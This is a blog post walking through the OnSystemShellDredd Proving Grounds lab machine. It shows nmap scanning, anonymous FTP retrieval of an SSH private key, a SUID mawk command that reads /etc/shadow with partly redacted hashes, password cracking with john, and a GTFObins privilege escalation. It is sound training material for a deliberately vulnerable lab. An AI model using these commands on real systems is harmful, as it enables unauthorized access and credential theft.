<!DOCTYPE html>
<html lang="en">

<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
<link rel="stylesheet" href="/assets/css/style.css">
<title>Proving grounds Play: OnSystemShellDredd</title>
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Proving grounds Play: OnSystemShellDredd | Thevillagehacker’s Blog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Proving grounds Play: OnSystemShellDredd" />
<meta name="author" content="Naveen" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Offsec proving grounds play linux machine writeup" />
<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
<link rel="canonical" href="http://localhost:4000/2023/07/07/Proving_grounds_Play-OnSystemShellDredd.html" />
<meta property="og:url" content="http://localhost:4000/2023/07/07/Proving_grounds_Play-OnSystemShellDredd.html" />
<meta property="og:site_name" content="Thevillagehacker’s Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-07-07T22:10:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Proving grounds Play: OnSystemShellDredd" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-07-07T22:10:00+05:30","datePublished":"2023-07-07T22:10:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: OnSystemShellDredd","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/07/07/Proving_grounds_Play-OnSystemShellDredd.html"},"url":"http://localhost:4000/2023/07/07/Proving_grounds_Play-OnSystemShellDredd.html"}</script>
<!-- End Jekyll SEO tag -->


<script type="text/javascript" src="/assets/js/darkmode.js"></script>

</head><body>
  <main class="container">
    <section class="about">
      <div class="about-header condensed">
      <div class="about-title">
      <a href="/">
        
        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
        
      </a>
      <h2 id="title">
        <a href="/">Naveen Jagadeesan</a>
      </h2>
      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
      
      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
          <li>
            <i class="icon-github-circled"></i>
          </li>
        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
          <li>
            <i class="icon-linkedin-squared"></i>
          </li>
        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
          <li>
            <i class="icon-twitter-squared"></i>
          </li>
        </a></ul><p class="about-footer condensed">&copy;
        2024</p><div class="about-footer condensed">
        <p>Dark Mode
          <i class="icon-moon"></i>
          <label class="switch">
            <input type="checkbox" class="dark-mode-toggle">
            <span class="slider round" onclick="toggleDarkMode()"></span>
          </label>
        </p>
      </div>
    </section>
    <section class="content">
      <div class="post-container">
  <a class="post-link" href="/2023/07/07/Proving_grounds_Play-OnSystemShellDredd.html">
    <h2 class="post-title">Proving grounds Play: OnSystemShellDredd</h2>
  </a>
  <div class="post-meta">
    <div class="post-date"><i class="icon-calendar"></i>Jul 7, 2023</div></div>
  <div class="post">
    <h2 id="walkthrough-on-youtube">Walkthrough on Youtube</h2>
<p><a href="https://youtu.be/UPYHCc7PdGQ"><img src="/assets/images/CTF/Proving_Grounds/OnSystemShellDredd/youtube.png" alt="youtube" /></a></p>

<h2 id="nmap">NMAP</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace|01:02 AM|~/Pg-Play<span class="nv">$ </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> 192.168.191.130 <span class="nt">-v</span> <span class="nt">-oN</span> nmap                                                                                           
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-08 01:02 EDT                                                
PORT      STATE SERVICE VERSION                                                              
21/tcp    open  ftp     vsftpd 3.0.3                                                         
|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>                                       
| ftp-syst:                                                                                  
|   STAT:                                                                                    
| FTP server status:                                                                         
|      Connected to ::ffff:192.168.45.250                                                    
|      Logged <span class="k">in </span>as ftp                                                                      
|      TYPE: ASCII                                                                           
|      No session bandwidth limit                                                            
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300                                                     
|      Control connection is plain text                                                      
|      Data connections will be plain text                                                   
|      At session startup, client count was 4                                                
|      vsFTPd 3.0.3 - secure, fast, stable                                                   
|_End of status                                                                              
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>                       
| ssh-hostkey:                                                                               
|   2048 592d210c2faf9d5a7b3ea427aa378908 <span class="o">(</span>RSA<span class="o">)</span>                                              
|   256 5926da443b97d230b19b9b02748b8758 <span class="o">(</span>ECDSA<span class="o">)</span>                                             
|_  256 8ead104fe33e652840cb5bbf1d247f17 <span class="o">(</span>ED25519<span class="o">)</span>                                           
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel                               
</code></pre></div></div>

<h2 id="ftp-login">FTP login</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace|01:07 AM|~<span class="nv">$ </span>ftp 192.168.191.130 21                                       
Connected to 192.168.191.130.                                                                
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>                                                                           
Name <span class="o">(</span>192.168.191.130:naveenj<span class="o">)</span>: anonymous                                                    
331 Please specify the password.                                                             
Password:                                                                                    
230 Login successful.                                                                        
Remote system <span class="nb">type </span>is UNIX.                                                                  
Using binary mode to transfer files.                                                         
ftp&gt;
</code></pre></div></div>

<h3 id="list-directory">List directory</h3>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-lsa</span>                                                                                 
229 Entering Extended Passive Mode <span class="o">(||</span>|13654|<span class="o">)</span>                                               
150 Here comes the directory listing.                                                        
drwxr-xr-x    3 0        115          4096 Aug 06  2020 <span class="nb">.</span>                                    
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..                                   
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah                              
226 Directory send OK.                                                                       
ftp&gt;
</code></pre></div></div>

<h2 id="changing-directory">Changing directory</h2>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">cd</span> .hannah                                                                              
250 Directory successfully changed.                                                          
ftp&gt; <span class="nb">ls</span> <span class="nt">-lsa</span>                                                                                 
229 Entering Extended Passive Mode <span class="o">(||</span>|8389|<span class="o">)</span>                                                
150 Here comes the directory listing.                                                        
drwxr-xr-x    2 0        0            4096 Aug 06  2020 <span class="nb">.</span>                                    
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..                                   
<span class="nt">-rwxr-xr-x</span>    1 0        0            1823 Aug 06  2020 id_rsa                               
226 Directory send OK.                                                                       
ftp&gt;
</code></pre></div></div>

<h2 id="get-id_rsa-key-for-user-hannah">Get id_rsa key for user hannah</h2>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; get id_rsa                                                                              
<span class="nb">local</span>: id_rsa remote: id_rsa                                                                 
229 Entering Extended Passive Mode <span class="o">(||</span>|17682|<span class="o">)</span>                                               
150 Opening BINARY mode data connection <span class="k">for </span>id_rsa <span class="o">(</span>1823 bytes<span class="o">)</span><span class="nb">.</span>                             
100% |<span class="k">************************************************</span>|  1823       11.66 MiB/s    00:00 ETA 
226 Transfer complete.                                                                       
1823 bytes received <span class="k">in </span>00:00 <span class="o">(</span>8.97 KiB/s<span class="o">)</span>                                                    
ftp&gt;
</code></pre></div></div>

<h2 id="login-to-hannah-user-using-ssh">Login to hannah user using ssh</h2>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace|01:12 AM|~/Pg-Play/OnSystemShellDredd<span class="nv">$ </span>ssh <span class="nt">-i</span> files/id_rsa hannah@192.168.191.130                                                                                     
ssh: connect to host 192.168.191.130 port 22: Connection refused
</code></pre></div></div>

<p>Apply required permission such as <code class="language-plaintext highlighter-rouge">chmod 600</code> to the id_rsa file. Still the connection will be refused. As we have one more ssh service running on PORT 61000, we can try to connect there.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace|01:15 AM|~/Pg-Play/OnSystemShellDredd<span class="nv">$ </span>ssh <span class="nt">-i</span> files/id_rsa hannah@192.168.191.130 <span class="nt">-p</span> 61000                                                                           
                                                                 
hannah@ShellDredd:~<span class="nv">$ </span>
</code></pre></div></div>
<p>Whooo! we are logged in to hannah user now.</p>

<h3 id="obtaining-flag">Obtaining Flag</h3>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hannah@ShellDredd:~<span class="nv">$ </span><span class="nb">ls
</span>local.txt  user.txt
hannah@ShellDredd:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
Your flag is <span class="k">in </span>another file...
hannah@ShellDredd:~<span class="nv">$ </span><span class="nb">cat </span>local.txt
5b571██████████████████████████
hannah@ShellDredd:~<span class="nv">$ </span>
</code></pre></div></div>

<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Get SUIDs and GUIDs</p>

<h3 id="suids">SUIDs</h3>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hannah@ShellDredd:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk <span class="c">#--strange binary</span>
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit <span class="c">#--strange binary</span>
/usr/bin/mount
/usr/bin/passwd
</code></pre></div></div>

<h3 id="guids">GUIDs</h3>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hannah@ShellDredd:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-g</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
/usr/sbin/unix_chkpwd
/usr/bin/wall
/usr/bin/mawk
/usr/bin/ssh-agent
/usr/bin/crontab
/usr/bin/chage
/usr/bin/expiry
/usr/bin/bsd-write
/usr/bin/cpulimit
/usr/bin/dotlockfile
</code></pre></div></div>

<p>Search for the exploit in GFTObins for the strange binary <code class="language-plaintext highlighter-rouge">mawk</code></p>

<p><img src="/assets/images/CTF/Proving_Grounds/OnSystemShellDredd/suid_mawk.png" alt="img" /></p>

<p>The exploit worked and we are able to view the shadow file which contains hash of the users passwords.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hannah@ShellDredd:~<span class="nv">$ </span>mawk <span class="s1">'//'</span> <span class="s2">"/etc/shadow"</span> | <span class="nb">grep</span> <span class="nt">-iE</span> <span class="s1">'root|hannah'</span>
root:<span class="nv">$6$pUGgTFAG7pM5Sy5M$SXmRNf2GSZhId7mGCsFw</span>█████████████████████████████████████████████████████████:18656:0:99999:7:::
hannah:<span class="nv">$6$y8GL381zxgwD7gRr$AhERcqNym1qlATj9Rl6R</span>██████████████████████████████████████████████████████.:18656:0:99999:7:::
</code></pre></div></div>

<p>Let’s start cracking the hashes using john or crackstation.</p>

<p>Copy both the passwd and shadow files to the local machine to unshadow.</p>

<p><code class="language-plaintext highlighter-rouge">unshadow passwd shadow &gt; crackme</code> run the command to unshadow the file.</p>

<h3 id="running-john">Running john</h3>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace|01:56 AM|~/Pg-Play/OnSystemShellDredd/files<span class="nv">$ </span>john crackme <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt                                                                 
Using default input encoding: UTF-8                                                          
Loaded 2 password hashes with 2 different salts <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6$ </span><span class="o">[</span>SHA512 128/128 AVX 2x]<span class="o">)</span>                                                                                       
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes                                       
Will run 4 OpenMP threads                                                                    
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
</code></pre></div></div>

<p>After a while there is no progress, so lets check another way.</p>

<p>Let’s check the <code class="language-plaintext highlighter-rouge">/usr/bin/cpulimit</code> binary in GTFObins for exploits.</p>

<p><img src="/assets/images/CTF/Proving_Grounds/OnSystemShellDredd/suid_cpulimit.png" alt="img" /></p>

<p>Running the exploit command.</p>

<p><img src="/assets/images/CTF/Proving_Grounds/OnSystemShellDredd/root.png" alt="img" /></p>

<p>Obtained root and proof flag.</p>

<p><em>Happy Hacking!</em></p>

<p>Thanks for reading!</p>

<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>

  </div></div>

    </section>
    <footer class="condensed">
      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
          <li>
            <i class="icon-github-circled"></i>
          </li>
        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
          <li>
            <i class="icon-linkedin-squared"></i>
          </li>
        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
          <li>
            <i class="icon-twitter-squared"></i>
          </li>
        </a></ul><p class="about-footer condensed">&copy;
        2024</p><div class="about-footer condensed">
        <p>Dark Mode
          <i class="icon-moon"></i>
          <label class="switch">
            <input type="checkbox" class="dark-mode-toggle">
            <span class="slider round" onclick="toggleDarkMode()"></span>
          </label>
        </p>
      </div>
    </footer>
  </main>
  
  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
  
  <script src="/assets/js/simple-jekyll-search.min.js"></script>
  <script src="/assets/js/search.js"></script>
  
</body>

</html>
